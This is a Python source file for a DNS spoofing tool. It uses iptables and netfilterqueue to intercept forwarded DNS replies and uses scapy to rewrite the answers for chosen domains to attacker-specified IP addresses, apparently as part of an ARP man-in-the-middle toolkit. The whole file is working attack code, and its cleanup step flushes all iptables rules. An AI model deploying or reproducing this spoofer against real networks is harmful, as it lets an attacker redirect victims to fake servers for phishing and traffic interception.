#!/usr/bin/env python
from classes.ARPPacket import ARPPacket
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

class DNS:
    def __init__(self, replacement_map, queue_num, use_print = True):
        self.map = replacement_map
        self.num = queue_num
        self.use_print = use_print
        self.queue = NetfilterQueue()

    def spoof(self):
        self.iPrint("Starting DNS spoof")
        self.iPrint(self.map)
        # insert the iptables FORWARD rule
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(self.num))
        try:
            # bind the queue number to our callback `process_packet`
            # and start it
            self.queue.bind(self.num, self.queue_callback)
            self.queue.run()
        except KeyboardInterrupt:
            # if want to exit, make sure we
            # remove that rule we just inserted, going back to normal.
            os.system("iptables --flush")
            self.iPrint("Finishing DNS spoof")

    def queue_callback(self, packet):
        """
        Whenever a new packet is redirected to the netfilter queue,
        this callback is called.
        """
        # convert netfilter queue packet to scapy packet
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            # if the packet is a DNS Resource Record (DNS reply)
            # modify the packet
            print("[Before]:", scapy_packet.summary())
            try:
                scapy_packet = self.modify_packet(scapy_packet)
            except IndexError:
                print("Index error occured")
                # not UDP packet, this can be IPerror/UDPerror packets
                pass
            print("[After ]:", scapy_packet.summary())
            print("")
            # set back as netfilter queue packet
            packet.set_payload(bytes(scapy_packet))
        # accept the packet
        packet.accept()

    def modify_packet(self, packet):
        """
        Modifies the DNS Resource Record `packet` ( the answer part)
        to map our globally defined `dns_hosts` dictionary.
        For instance, whenver we see a google.com answer, this function replaces 
        the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
        """
        # get the DNS question name, the domain name
        qname = packet[DNSQR].qname
        if qname not in self.map:
            # if the website isn't in our record
            # we don't wanna modify that
            print("no modification:", qname)
            return packet
        else:
            print("Did modification", qname)
            # craft new answer, overriding the original
            # setting the rdata for the IP we want to redirect (spoofed)
            # for instance, google.com will be mapped to "192.168.1.100"
            x = self.map[qname]
            print("Loc0")
            print(packet.summary())
            packet[DNS].an = DNSRR(rrname=qname, rdata=x)
            print("Loc1")
            # set the answer count to 1
            packet[DNS].ancount = 1
            print("Loc2")
            # delete checksums and length of packet, because we have modified the packet
            # new calculations are required ( scapy will do automatically )
            del packet[IP].len
            print("Loc3")
            del packet[IP].chksum
            print("Loc4")
            del packet[UDP].len
            print("Loc5")
            del packet[UDP].chksum
            # return the modified packet
            print("Returning...")
            print("Check:",packet.summary())
            return packet

    def iPrint(self, text):
        if(self.use_print):
            print(text)